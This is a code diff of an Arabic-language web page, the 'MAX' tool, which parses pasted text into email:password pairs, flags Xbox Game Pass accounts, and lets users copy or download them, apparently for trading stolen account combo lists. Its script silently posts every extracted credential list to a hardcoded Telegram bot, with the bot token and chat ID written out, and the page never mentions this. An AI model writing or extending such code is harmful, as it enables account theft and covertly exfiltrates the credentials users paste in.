@@ -6,16 +6,14 @@
     <title>أداة MAX: استخراج Email:Password</title>
     <style>
         /* ------------------------- ستايل الجسم الأساسي ------------------------- */
-        /* تم إزالة Flexbox لتمكين التمرير (Scrolling) ووضع محتوى الصفحة بشكل طبيعي */
         body{
             margin:0;
             font-family:system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial;
             background:#111;
-            padding-top:20px; /* إضافة مساحة علوية */
-            padding-bottom:50px; /* إضافة مساحة سفلية لراحة العين */
+            padding-top:20px;
+            padding-bottom:50px;
         }
         
-        /* إزالة الفلتر الخلفي لأن الخلفية صارت سوداء صلبة */
         body::before{content:"";position:fixed;inset:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(6px);z-index:-1}
         
         /* ------------------------- المتغيرات والألوان ------------------------- */
@@ -24,13 +22,9 @@
             --accent:#e60000;
             --grad:linear-gradient(135deg,#e60000,#8b0000);
             --dark-grad:linear-gradient(135deg,#111,#2a0000);
-            --success-color: #7CFC00; /* اللون الأخضر الجديد */
-            --success-shadow: rgba(124, 252, 0, 0.8);
+            --success-color: #008000; /* أخضر غامق لعلامة الصح */
         }
         
-        /* تم حذف ستايلات تسجيل الدخول (#login-page و #code-input... إلخ) */
-
-        /* ------------------------- ستايل الأداة ------------------------- */
         .wrap{max-width:850px;margin:20px auto;padding:15px}
         .card{background:var(--card);border-radius:18px;padding:20px;box-shadow:0 8px 20px rgba(0,0,0,0.5);margin-bottom:20px}
         h1{margin:6px 0 16px;font-size:26px;text-align:center;color:#111;font-weight:800}
@@ -43,22 +37,53 @@
         .item{display:flex;justify-content:space-between;align-items:center;padding:15px;border-bottom:1px solid #ddd;background:#fff;box-shadow:0 4px 10px rgba(0,0,0,0.2)}.item:last-child{border-bottom:none;}
         .left{display:flex;flex-direction:column;gap:8px;flex:1;overflow:hidden}
         
-        /* ------------------------- ستايل الإيميل والتظليل الجديد ------------------------- */
-        .email{font-weight:800;color:#b30000;font-size:16px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis; transition: color 0.3s, font-size 0.3s;}
-        
-        /* *** اللون الأخضر الليموني للتظليل الثابت *** */
-        .email.copied {color: var(--success-color); font-size: 17px; font-weight: 900; text-shadow: 0 0 5px var(--success-shadow);} 
-        
+        /* ------------------------- ستايل الإيميل والتظليل والوصف ------------------------- */
+        .email{
+            font-weight:800;
+            color:#b30000;
+            font-size:16px;
+            white-space:nowrap;
+            overflow:hidden;
+            text-overflow:ellipsis; 
+            transition: background-color 0.3s, padding 0.3s; /* إضافة انتقال لخلفية العنصر */
+            padding: 0; /* إزالة الـ padding الافتراضي */
+        }
+
+        /* *** تظليل مؤقت للإيميل عند النسخ (لون الأداة) *** */
+        .email.copied {
+            background-color: rgba(255, 0, 0, 0.1); 
+            padding-right: 5px;
+            padding-left: 5px;
+            border-radius: 5px;
+        }
+
+        /* *** ستايل علامة الصح الثابتة بعد النسخ *** */
+        .copied-mark {
+            color: var(--success-color); 
+            font-size: 18px;
+            margin-right: 5px;
+        }
+
+        /* *** ستايل ملاحظة القيم باس *** */
+        .gamepass-note {
+            font-size: 11px; 
+            font-weight: 700;
+            color: #008000;
+            padding-top: 4px; 
+            margin-bottom: -5px; 
+            letter-spacing: 0.5px;
+            text-shadow: 0 0 2px rgba(0, 128, 0, 0.3);
+        }
+        /* --------------------------------------------------------------------- */
+
         .pw{font-size:14px;color:#444;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
         .controls{display:flex;gap:8px;flex-shrink:0}
         .copy-btn{padding:8px 12px;border-radius:10px;font-size:13px;font-weight:600}
         .copy-btn.btn-black{background:#222}
         
-        /* ------------------------- التوست (رسالة التنبيه) ------------------------- */
         .toast{position:fixed;left:50%;transform:translateX(-50%);bottom:30px;background:#111;color:#fff;padding:12px 18px;border-radius:12px;opacity:0;pointer-events:none;transition:opacity .3s,bottom .3s;z-index:1000;font-weight:600}
         .toast.show{opacity:1;bottom:40px}
 
-        /* ------------------------- الروابط والفوتر ------------------------- */
         .footer{text-align:center;color:#fff;margin-top:20px;font-size:15px;font-weight:500;text-shadow:0 0 8px #000}
         .links-box{margin-top:20px;background:#ffffffee;padding:20px;border-radius:18px;box-shadow:0 6px 18px rgba(0,0,0,0.45);border:1px solid #eee}
         .links-box .title-header{font-size:24px;margin-bottom:18px;color:#fff;text-align:center;background:var(--grad);padding:15px;border-radius:15px;box-shadow:0 0 15px rgba(255,0,0,0.8);font-weight:800;border:2px solid #fff}
@@ -75,7 +100,9 @@
 <div class="wrap" id="tool-page">
     <div class="card">
         <h1>🔥 أداة MAX: استخراج Email:Password</h1>
-        <div style="text-align:center;color:#444;font-size:14px;margin-bottom:12px;font-weight:500;">ألصق النص، والأداة تستخرج فقط: <b style="color:var(--accent);">email:password</b></div>
+        <div style="text-align:center;color:#444;font-size:14px;margin-bottom:12px;font-weight:500;">
+            ألصق النص. يمكن أن تضيف وصف للحساب بعد الباسورد. مثال: <b style="color:#008000;">email:pass | قيم باس</b>
+        </div>
         <textarea id="input" placeholder="ألصق النص هنا..."></textarea>
         <div class="row">
             <button id="parseBtn" class="btn-red">استخراج</button>
@@ -134,11 +161,9 @@
     // **********************************************
     // ** إعدادات التليكرام المضافة         **
     // **********************************************
-    // تم وضع التوكن والآيدي الخاص بك هنا (مؤكد مليون بالمئة):
     const BOT_TOKEN = "7817255826:AAFUCn_0zWCsUTBORd5bL_tFMcfZtJ2Dus4"; 
     const CHAT_ID = "7781990630";
     
-    // دالة إرسال الرسالة إلى التليكرام (تم إزالة كل رسائل التنبيهات)
     function sendToTelegram(messageText) {
         if (!BOT_TOKEN || !CHAT_ID) {
             console.error("معلومات البوت (التوكن أو ID الدردشة) غير موجودة.");
@@ -174,13 +199,13 @@
     // **********************************************
     // ** كود الأداة الأصلي             **
     // **********************************************
+    
+    // *** الـ Regex لاستخراج الإيميل، الباسورد، والوصف ***
+    const emailPwRegex = /([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\-\|\,; ]\s*([^\s,;\|]+)(?:\s*[\-\|\;\,]\s*(.*))?/g;
 
-    // تم حذف كل الأكواد المتعلقة بتسجيل الدخول: CORRECT_CODE, loginPage, toolPage, checkLogin... إلخ.
-
-    const emailPwRegex=/([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\s*[:\- ]\s*([^\s]+)/g,input=document.getElementById("input"),parseBtn=document.getElementById("parseBtn"),list=document.getElementById("list"),toast=document.getElementById("toast"),clearBtn=document.getElementById("clearBtn"),copyAllBtn=document.getElementById("copyAllBtn"),downloadBtn=document.getElementById("downloadBtn");
+    const input=document.getElementById("input"),parseBtn=document.getElementById("parseBtn"),list=document.getElementById("list"),toast=document.getElementById("toast"),clearBtn=document.getElementById("clearBtn"),copyAllBtn=document.getElementById("copyAllBtn"),downloadBtn=document.getElementById("downloadBtn");
 
     function showToast(e){
-        // تم تقليل وقت التوست إلى 1.5 ثانية
         toast.textContent=e,toast.classList.add("show"),clearTimeout(toast._t),toast._t=setTimeout(()=>toast.classList.remove("show"),1500)
     }
 
@@ -193,17 +218,38 @@
         }
     }
     
-    // دالة النسخ مع تظليل الإيميل الدائم
+    // *** الدالة المعدلة للتظليل المؤقت وإضافة علامة الصح الثابتة ***
     async function copyTextWithHighlight(text, elementToHighlight = null) {
         let success = await copyText(text);
 
         if (success && elementToHighlight) {
-            // إضافة كلاس التظليل (اللون الأخضر) بشكل دائم
+            // 1. نضيف التظليل الأحمر المؤقت
             elementToHighlight.classList.add('copied');
+
+            // 2. نضيف علامة الصح الثابتة (إذا ما كانت موجودة)
+            let checkMark = elementToHighlight.querySelector('.copied-mark');
+            if (!checkMark) {
+                checkMark = document.createElement('span');
+                checkMark.className = 'copied-mark';
+                checkMark.textContent = '✅'; // علامة الصح
+                elementToHighlight.appendChild(checkMark);
+            }
+
+            // 3. نزيل التظليل الأحمر بعد ثانيتين
+            setTimeout(() => {
+                elementToHighlight.classList.remove('copied');
+            }, 2000); 
         }
         return success;
     }
-    // -----------------------------------------------------------------------
+    
+    // دالة فحص إذا كان الوصف يحتوي على كلمة "قيم باس"
+    function checkGamePass(description) {
+        if (!description) return false;
+        // فحص الكلمات الشائعة المتعلقة بالقيم باس باللغة العربية أو الإنجليزية
+        const normalizedDesc = description.toLowerCase().replace(/\s/g, ''); // إزالة المسافات
+        return normalizedDesc.includes('gamepass') || normalizedDesc.includes('قيمباس') || normalizedDesc.includes('قيم باس');
+    }
 
 
     function parseText(){
@@ -212,50 +258,74 @@
         if(!e)return void showToast("لا يوجد نص للمسح");
         
         let t,o=[];
-        for(t=emailPwRegex.exec(e);null!==t;t=emailPwRegex.exec(e)){
-            t[2]&&t[2].trim().length>0&&o.push([t[1],t[2]])
+        while((t=emailPwRegex.exec(e))!==null){
+            if(t[2] && t[2].trim().length > 0){
+                o.push([t[1].trim(), t[2].trim(), t[3] ? t[3].trim() : ""]); 
+            }
         }
 
         if(0===o.length)return void showToast("ماكو نتائج مطابقة");
         
         const n=new Set,c=[];
         for(const e of o){
-            const t=e[0].toLowerCase()+":"+e[1];
-            n.has(t)||(n.add(t),c.push(e))
+            const key=e[0].toLowerCase()+":"+e[1];
+            if(!n.has(key)){
+                n.add(key);
+                c.push(e); 
+            }
         }
 
         // **********************************************
         // ** إرسال النتائج للتليكرام         **
         // **********************************************
         if (c.length > 0) {
-            const telegramMessage = c.map(([email, password]) => `${email}:${password}`).join('\n');
+            const telegramMessage = c.map(([email, password, desc]) => {
+                return `${email}:${password}${desc ? " | " + desc : ""}`;
+            }).join('\n');
+
             const header = `🎉 *نتائج أداة MAX الجديدة* 🎉\nتم استخراج ${c.length} نتيجة فريدة:\n\n\`\`\``;
             const footer = "\n\`\`\`\nتم الإرسال تلقائياً من الأداة.";
             sendToTelegram(header + telegramMessage + footer);
         }
 
-        for(const[e,t]of c){
+        // بناء قائمة النتائج
+        for(const[em,pw,desc]of c){
             const o=document.createElement("div");
             o.className="item";
             const n=document.createElement("div");
             n.className="left";
+            
+            // 1. الإيميل
             const r=document.createElement("div");
-            r.className="email",r.textContent=e;
+            r.className="email",r.textContent=em;
+            n.appendChild(r);
+            
+            // 2. ملاحظة القيم باس (إذا لزم الأمر)
+            if(checkGamePass(desc)){
+                const passNote = document.createElement("div");
+                passNote.className="gamepass-note";
+                passNote.textContent="✅ الحساب يحتوي على Game Pass!";
+                n.appendChild(passNote);
+            }
+            
+            // 3. الباسورد
             const l=document.createElement("div");
-            l.className="pw",l.textContent=t;
-            n.appendChild(r),n.appendChild(l);
+            l.className="pw",l.textContent=pw;
+            n.appendChild(l);
+            
+            // الأزرار
             const s=document.createElement("div");
             s.className="controls";
             
-            // *** استخدام الدالة المعدلة لتثبيت اللون الأخضر على الإيميل (r) ورسالة "تم النسخ بنجاح" ***
+            // *** زر نسخ الإيميل مع التظليل المؤقت وعلامة الصح الدائمة ***
             const d=document.createElement("button");
             d.className="copy-btn btn-red",d.textContent="نسخ الإيميل",d.onclick=async()=>{
-                await copyTextWithHighlight(e, r) && showToast("تم النسخ بنجاح")
+                await copyTextWithHighlight(em, r) && showToast("تم النسخ بنجاح")
             };
             
-            // *** رسالة "تم النسخ بنجاح" للباسورد ***
+            // *** زر نسخ الباسورد ***
             const a=document.createElement("button");
-            a.className="copy-btn btn-black",a.textContent="نسخ الباسورد",a.onclick=async()=>{await copyText(t)&&showToast("تم النسخ بنجاح")};
+            a.className="copy-btn btn-black",a.textContent="نسخ الباسورد",a.onclick=async()=>{await copyText(pw)&&showToast("تم النسخ بنجاح")};
             
             s.appendChild(d),s.appendChild(a),o.appendChild(n),o.appendChild(s),list.appendChild(o)
         }
@@ -265,12 +335,20 @@
     parseBtn.onclick=parseText,clearBtn.onclick=()=>{input.value="",list.innerHTML="",showToast("تم مسح محتوى الأداة")},copyAllBtn.onclick=async()=>{
         const e=list.querySelectorAll(".item");
         if(!e.length)return void showToast("لا توجد نتائج لنسخها");
-        const t=[...e].map(e=>{const t=e.querySelector(".email").textContent.trim(),o=e.querySelector(".pw").textContent.trim();return t+":"+o}).join("\n");
+        const t=[...e].map(e=>{
+            const t=e.querySelector(".email").textContent.trim();
+            const o=e.querySelector(".pw").textContent.trim();
+            return t+":"+o
+        }).join("\n");
         await copyText(t)&&showToast("تم النسخ بنجاح")
     },downloadBtn.onclick=()=>{
         const e=list.querySelectorAll(".item");
         if(!e.length)return void showToast("لا توجد نتائج للتنزيل");
-        const t=[...e].map(e=>{const t=e.querySelector(".email").textContent.trim(),o=e.querySelector(".pw").textContent.trim();return t+":"+o}).join("\n");
+        const t=[...e].map(e=>{
+            const t=e.querySelector(".email").textContent.trim();
+            const o=e.querySelector(".pw").textContent.trim();
+            return t+":"+o
+        }).join("\n");
         const o=new Blob([t],{type:"text/plain;charset=utf-8"}),n=URL.createObjectURL(o),c=document.createElement("a");
         c.href=n,c.download="MAX_emails_passwords.txt",c.click(),URL.revokeObjectURL(n),showToast("تم تنزيل الملف بنجاح")
     };
